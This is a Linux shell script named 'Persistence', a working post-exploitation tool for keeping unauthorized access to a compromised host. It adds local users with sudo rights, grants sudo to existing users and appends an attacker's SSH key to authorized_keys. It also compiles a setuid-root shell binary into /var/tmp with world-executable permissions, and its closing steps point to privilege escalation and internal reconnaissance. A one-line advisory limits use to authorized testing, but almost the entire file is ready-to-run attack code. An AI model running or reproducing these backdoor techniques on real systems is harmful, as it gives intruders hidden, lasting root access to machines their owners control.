#!/bin/sh
# Persistence

####################
# Global variables #
####################

# colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC="\033[0m" # No Color
# bold
BRED='\033[1;31m'
BGREEN='\033[1;32m'
BYELLOW='\033[1;33m'
BBLUE='\033[1;34m'
# text
BOLD=$(tput bold)
NORMAL='\033[0;39m'


#############
# Functions #
#############

# Print banner
fuBANNER() {
# http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something
echo "
  ____   _____  ____   ____  ___  ____  _____  _____  _   _   ____  _____ 
 |  _ \ | ____||  _ \ / ___||_ _|/ ___||_   _|| ____|| \ | | / ___|| ____|
 | |_) ||  _|  | |_) |\___ \ | | \___ \  | |  |  _|  |  \| || |    |  _|  
 |  __/ | |___ |  _ <  ___) || |  ___) | | |  | |___ | |\  || |___ | |___ 
 |_|    |_____||_| \_\|____/|___||____/  |_|  |_____||_| \_| \____||_____|
                                                                     
"
}

# Print output title
fuTITLE() {
  echo
  echo "$BBLUE════════════════════════════════════════════════════════════════════════"
  echo "$BGREEN $1 $BBLUE"
  echo "════════════════════════════════════════════════════════════════════════$NC"
}

# Print info line
fuINFO() {
  echo
  echo "$BBLUE═══$BGREEN $1 $NC"
}

# Print error line
fuERROR() {
  echo
  echo "$BBLUE═══$BRED $1 $NC"
}

# Print results line
fuRESULT() {
  echo
  echo "$BBLUE═══$BYELLOW $1 $NC"
}

# Print next steps line
fuSTEPS() {
  echo
  echo "$BBLUE[X]$NC $1 $NC"
}

# Print message line
fuMESSAGE() {
  echo "$BBLUE---$NC $1 $NC"
}

# Print attention message line
fuATTENTION() {
  echo "$BLUE---$YELLOW $1 $NC"
}

# Check for root permissions
fuGOT_ROOT() {
fuINFO "Checking for root"
if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
  IAMROOT="1"
  fuMESSAGE "You are root"
  echo
else
  IAMROOT=""
  fuMESSAGE "You are not root"
  echo
fi
}


#####################################
# Check the command line parameters #
#####################################

PASSED_ARGS=$@
if [ "$PASSED_ARGS" != "" ]; then
  while getopts "he:rs:u:p:" opt; do
    case "$opt" in
      h|\?)
        echo
        echo "Usage: sh $0 [-h] [-e] [-r] [-s] [-u] [-p]"
        echo
        echo "-e <username>"
        echo "  Elevate privileges of the given user"
        echo "  Root needed!"
        echo
        echo "-r"
        echo "  Create a root shell"
        echo "  Root needed!"
        echo
        echo "-s <ssh public key / content of id_rsa.pub>"
        echo "  Trying to add ssh public key to authorized_keys of current user"
        echo
        echo "-u <username>"
        echo "  Add a local account/user"
        echo "  Root needed!"
        echo
        echo "-p <password>"
        echo "  Set this password to new user"
        echo "  Only useful in combination with -u parameter"
        echo "  Root needed!"
        echo
        exit;;
      e) ELEVATEPRIV="1";PRIVUSER=$OPTARG;;
      r) ROOTSHELL="1";;
      s) SSH="1";PUBKEY=$OPTARG;;
      u) ADDUSER="1";USERNAME=$OPTARG;;
      p) ADDPW="1";PW=$OPTARG;;
      esac
  done
else
  echo "$0: no arguments passed to script. Try -h for help."
  echo
  exit
fi

# validate OPTARG 
# todo


##########
# Banner #
##########

fuBANNER
echo
echo "${BYELLOW}Advisory: ${BBLUE}Use this script for educational purposes and/or for authorized penetration testing only. The author is not responsible for any misuse or damage caused by this script. Use at your own risk.$NC"
echo
sleep 1


#####################
# Checking for root #
#####################

fuGOT_ROOT
sleep 1


#################
# Local Account #
#################

if [ "$ADDUSER" ]; then
  echo "
      _       _     _   _                    _      _                             _   
     / \   __| | __| | | |    ___   ___ __ _| |    / \   ___ ___ ___  _   _ _ __ | |_ 
    / _ \ / _\` |/ _\` | | |   / _ \ / __/ _\` | |   / _ \ / __/ __/ _ \| | | | \'_ \| __|
   / ___ \ (_| | (_| | | |__| (_) | (_| (_| | |  / ___ \ (_| (_| (_) | |_| | | | | |_ 
  /_/   \_\__,_|\__,_| |_____\___/ \___\__,_|_| /_/   \_\___\___\___/ \__,_|_| |_|\__|
  "
  sleep 1

  # check -p parameter
  if [ ! "$ADDPW" ]; then fuERROR "Aborting! No password given. You cannot login to that user until you set a password. Use the -p parameter" && exit; fi

  # check if /bin/bash exists
  if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi

  fuTITLE "Trying to add the user \"$USERNAME\" with root privileges ..."
  sleep 2
  if [ "$BASH" ]; then
    if [ "$(command -v useradd 2>/dev/null)" ]; then
    #if $USERADD -g 0 -M -d /root -s /bin/bash $USERNAME 2>/dev/null; then
      if useradd -m -s /bin/bash $USERNAME 2>/dev/null; then
        ADDUSEROK="1" && fuINFO "user \"$USERNAME\" added"
      else
        ADDUSEROK="" && fuERROR "unable to add user \"$USERNAME\". You need root privileges. Try \"sudo sh $0\""
      fi
    else
      fuERROR "command \"useradd\" not found"
    fi
  else
    if [ "$(command -v useradd 2>/dev/null)" ]; then
      #if $USERADD -g 0 -M -d /root -s /bin/sh $USERNAME 2>/dev/null; then
      if useradd -m -s /bin/sh $USERNAME 2>/dev/null; then
        ADDUSEROK="1" && fuINFO "user \"$USERNAME\" added"
      else
        ADDUSEROK="" && fuERROR "unable to add user \"$USERNAME\". You need root privileges. Try \"sudo sh $0\""
      fi
    else
      fuERROR "command \"useradd\" not found"
    fi
  fi
  
  if [ "$ADDUSEROK" ]; then
    fuTITLE "Trying to add user \"$USERNAME\" to sudo group ..."
    sleep 2
    if [ "$(command -v usermod 2>/dev/null)" ]; then
      if $USERMOD -a -G sudo $USERNAME 2>/dev/null; then
        fuINFO "user \"$USERNAME\" added to sudo group"
      else
        fuERROR "unable to add user \"$USERNAME\" to sudo group"
      fi
    else
      fuERROR "command \"usermod\" not found"
    fi

    fuTITLE "Trying to add a password to user \"$USERNAME\" ..."
    sleep 2
    if [ "$ADDPW" ]; then
      if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then
        echo "$USERNAME:$PW" | sudo chpasswd
        fuINFO "given password added to user \"$USERNAME\""
      else
        echo "$PW" | sudo passwd $USERNAME
        fuINFO "given password added to user \"$USERNAME\""
      fi
    fi
  fi

elif [ "$ADDPW" ]; then
  fuERROR "No username given. Try to add a user with -u parameter and combine it with -p"
fi


######################
# Elevate Privileges #
######################

if [ "$ELEVATEPRIV" ]; then
  echo "
   _____ _                 _         ____       _       _ _                      
  | ____| | _____   ____ _| |_ ___  |  _ \ _ __(_)_   _(_) | ___  __ _  ___  ___ 
  |  _| | |/ _ \ \ / / _\` | __/ _ \ | |_) | '__| \ \ / / | |/ _ \/ _\` |/ _ \/ __|
  | |___| |  __/\ V / (_| | ||  __/ |  __/| |  | |\ V /| | |  __/ (_| |  __/\__ \.
  |_____|_|\___| \_/ \__,_|\__\___| |_|   |_|  |_| \_/ |_|_|\___|\__, |\___||___/
                                                                  |___/           
  "
 
  fuTITLE "Trying to add user \"$PRIVUSER\" to sudo group ..."
  sleep 2
  # check if given user exists
  if id -u $PRIVUSER >/dev/null 2>&1; then
    fuMESSAGE "user $PRIVUSER found"
    if [ "$(command -v usermod 2>/dev/null)" ]; then
      # add user to sudo group
      if $USERMOD -a -G sudo $PRIVUSER 2>/dev/null; then
        ELEVATEPRIVOK="1" && fuINFO "user \"$PRIVUSER\" added to sudo group"
      else
        ELEVATEPRIVOK="" && fuERROR "unable to add user \"$PRIVUSER\" to sudo group. Try \"sudo sh $0 ...\""
      fi
    else
      fuERROR "command \"usermod\" not found"
    fi
  else
    fuERROR "user $PRIVUSER not found"
  fi
fi


############
# SSH Keys #
############

if [ "$SSH" ]; then
  echo "
    __  __           _ _  __         ____ ____  _   _   _  __                      
   |  \/  | ___   __| (_)/ _|_   _  / ___/ ___|| | | | | |/ /___ _   _ ___         
   | |\/| |/ _ \ / _\` | | |_| | | | \___ \___ \| |_| | | ' // _ \ | | / __|        
   | |  | | (_) | (_| | |  _| |_| |  ___) |__) |  _  | | . \  __/ |_| \__ \  
   |_|  |_|\___/ \__,_|_|_|  \__, | |____/____/|_| |_| |_|\_\___|\__, |___/ 
                             |___/                               |___/             
  "
  sleep 1

  # check if sudo
  if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
    fuERROR "You are root! Don't run part \"modify ssh keys\" (-s) with \"sudo\""
    echo
    exit
  fi

  # check if local ssh server is running
  fuTITLE "Check if local ssh server is running ..."
  sleep 2
  if ps aux | grep sshd | grep -v grep 2>/dev/null; then
    fuMESSAGE "Local ssh server is running"
  elif netstat -plant | grep :22 | grep LISTEN 2>/dev/null; then
    fuMESSAGE "Local ssh server is listening on port 22"
  else
    fuERROR "Probably no ssh server running on this host"
  fi

  # set current user to $USER
  if [ "$(command -v whoami 2>/dev/null)" ]; then
    USER=$(whoami 2>/dev/null)
  else
    fuERROR "command \"whoami\" not found"
    # try with who am i
    #USER=$(who am i | awk '{print $1}' 2>/dev/null)
  fi
  
  # check if $HOME variable is set
  if [ ! "$HOME" ]; then
    if [ -d "/home/$USER" ]; then
      HOME="/home/$USER"
    fi
  fi
  
  # get local ip addresses
  LOCAL_IP=$(ip a | grep -vi docker | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")

  fuTITLE "Trying to add given ssh public key to authorized_keys file of user \"$USER\" ..."
  sleep 2
  if [ -d "$HOME/.ssh" ]; then
    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else SSHOK="" && fuERROR "unable to write authorized_keys" && TRYCHMOD="1"; fi
    if [ "$TRYCHMOD" ]; then
      if [ "$(command -v chmod 2>/dev/null)" ]; then
        chmod 700 "$HOME"/.ssh 2>/dev/null
        echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && fuINFO "authorized_keys updated"
      else 
        fuERROR "command \"chmod\" not found"
      fi
    else
      SSHOK="1" && echo "authorized_keys updated"
    fi
  else
    fuINFO "No .ssh directory exists, creating one ..."
    if [ "$(command -v mkdir 2>/dev/null)" ]; then
      mkdir "$HOME"/.ssh 2>/dev/null && chmod 700 "$HOME"/.ssh 2>/dev/null && chmod 600 "$HOME"/.ssh/authorized_keys 2>/dev/null
    else
      fuERROR "command \"mkdir\" not found"
    fi
    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && fuINFO "authorized_keys updated"; else SSHOK="" && fuERROR "unable to write authorized_keys"; fi
  fi
fi


#####################
# Create root shell #
#####################

if [ "$ROOTSHELL" ]; then
  echo "
     ____                _         ____             _     ____  _          _ _ 
    / ___|_ __ ___  __ _| |_ ___  |  _ \ ___   ___ | |_  / ___|| |__   ___| | |
   | |   | '__/ _ \/ _\` | __/ _ \ | |_) / _ \ / _ \| __| \___ \| '_ \ / _ \ | |
   | |___| | |  __/ (_| | ||  __/ |  _ < (_) | (_) | |_   ___) | | | |  __/ | |
    \____|_|  \___|\__,_|\__\___| |_| \_\___/ \___/ \__| |____/|_| |_|\___|_|_|
                                                                             
  "

  TMPDIR="/var/tmp"
  GCC=$(command -v gcc 2>/dev/null)
  CHOWN=$(command -v chown 2>/dev/null)
  CHMOD=$(command -v chmod 2>/dev/null)

  # check if /bin/bash exists
  if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi

  fuTITLE "Trying to add a shell as a binary with suid bit set ..."
  sleep 2
  if [ "$BASH" ]; then
    echo 'int main(void){setresuid(0, 0, 0);system("/bin/bash");}' > $TMPDIR/morannon.c
  else
    echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR/morannon.c
  fi
  if $GCC $TMPDIR/morannon.c -o $TMPDIR/morannon 2>/dev/null; then
    fuMESSAGE "root shell \"$TMPDIR/morannon\" created"
  else
    fuERROR "root shell not created"
  fi
  rm $TMPDIR/morannon.c
  if $CHOWN root:root $TMPDIR/morannon && $CHMOD 4777 $TMPDIR/morannon; then
    ROOTSHELLOK="1" && fuINFO "root shell \"$TMPDIR/morannon\" usable"
  else
    ROOTSHELLOK="" && fuERROR "root shell not usable"
  fi
fi


##############
# Next Steps #
##############
  
echo "
   _   _           _     ____  _                   _____       ____                
  | \ | | _____  _| |_  / ___|| |_ ___ _ __  ___  |_   _|__   |  _ \  ___          
  |  \| |/ _ \ \/ / __| \___ \| __/ _ \ '_ \/ __|   | |/ _ \  | | | |/ _ \         
  | |\  |  __/>  <| |_   ___) | ||  __/ |_) \__ \   | | (_) | | |_| | (_) |  _ _ _ 
  |_| \_|\___/_/\_\ __| |____/ \__\___| .__/|___/   |_|\___/  |____/ \___/  (_|_|_)
                                      |_|                                          
"

if [ "$ADDUSER" ]; then
  if [ "$ADDUSEROK" ]; then
    fuSTEPS "User $USERNAME added. To login with ssh, switch to the new user (su $USERNAME) and run the script again with -s parameter."
  fi
fi

if [ "$ELEVATEPRIV" ]; then
  if [ "$ELEVATEPRIVOK" ]; then
    fuSTEPS "You already ran this script with sudo! So skip privilege escalation phase and move on to internal reconnaissance."
  fi
fi

if [ "$SSH" ]; then
  if [ "$SSHOK" ]; then
    fuSTEPS "authorized_key file updated, if ssh server is running, remote ssh login should be possible to user \"$USER\" with given SSH key pair."
    for ip in $LOCAL_IP; do
      fuSTEPS "From your Host: Try \"ssh $USER@$ip\""
    done
  fi
fi

if [ "$ROOTSHELL" ]; then
  if [ "$ROOTSHELLOK" ]; then
    fuSTEPS "A local shell was created that gives you root privileges! You can use it as follows: \"$TMPDIR/morannon\"."
  fi
fi

echo